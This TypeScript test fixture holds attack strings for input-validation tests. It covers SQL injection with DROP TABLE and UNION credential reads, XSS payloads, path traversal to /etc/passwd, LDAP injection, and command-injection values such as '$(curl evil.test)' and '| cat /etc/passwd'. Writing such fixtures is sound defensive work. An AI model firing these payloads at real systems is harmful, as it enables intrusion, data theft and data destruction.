/**
 * Common attack strings for input validation tests.
 * Use with typed validators (email, phone, name, numeric) — expect rejection.
 * Free-text fields may accept these as literal strings; storage must use parameterized queries + output encoding.
 */

export const SQL_INJECTION = [
  "' OR '1'='1",
  "1; DROP TABLE users;--",
  "Robert'); DROP TABLE students;--",
  "' UNION SELECT NULL, username, password FROM users--",
  "admin'--",
  "1' OR '1' = '1",
] as const;

export const XSS_PAYLOADS = [
  "<script>alert('xss')</script>",
  "<img src=x onerror=alert(1)>",
  "javascript:alert(1)",
  "\"><svg/onload=alert(1)>",
  "';alert(String.fromCharCode(88,83,83))//",
] as const;

export const PATH_TRAVERSAL = [
  "../../etc/passwd",
  "..\\..\\windows\\system32",
  "%2e%2e%2fetc%2fpasswd",
] as const;

export const COMMAND_INJECTION = [
  "; ls -la",
  "| cat /etc/passwd",
  "`whoami`",
  "$(curl evil.test)",
] as const;

export const LDAP_INJECTION = [
  "*)(uid=*))(|(uid=*",
  "admin)(|(password=*))",
] as const;

export const NULL_AND_CONTROL = [
  "",
  "   ",
  "\0",
  "\u0000injected",
  "\n\r\t",
] as const;

export const OVERFLOW = [
  "a".repeat(10_000),
  "9".repeat(500),
] as const;

/** Payloads that must fail strict format validators (email, phone, name, zip, numeric). */
export const STRICT_FIELD_ATTACKS = [
  ...SQL_INJECTION,
  ...XSS_PAYLOADS,
  ...PATH_TRAVERSAL,
  ...COMMAND_INJECTION,
] as const;

/** Passes person-name regex but is a known SQLi probe — safe only with parameterized storage. */
export const KNOWN_NAME_FORMAT_PASSES = ["admin'--"] as const;

/** Email local-part probes appended to @evil.com for account-step tests. */
export function maliciousEmails(): string[] {
  return STRICT_FIELD_ATTACKS.map((p) => `${p}@evil.com`);
}
